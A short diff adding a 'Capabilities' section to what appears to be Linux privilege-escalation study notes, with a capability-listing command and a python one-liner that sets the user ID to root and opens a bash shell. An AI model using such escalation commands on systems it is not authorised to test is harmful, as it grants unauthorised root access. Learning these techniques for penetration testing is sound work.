@@ -197,6 +197,10 @@ void_init(){
   - We will get a escalated shell.
 
 ## Escalation Path: Capabilities
+- `getcap -r / 2>/dev/null`
+- If it has ep, then,
+  - Example: `/usr/bin/python2.6 -c 'import os;os.setuid(0); os.system("/bin/bash")'`
+  - It can be done with python, tar, openssl, perl and many more which have ep cabailities. (ep means permitted everything)
 
 ## Escalation Path: Scheduled Tasks
 
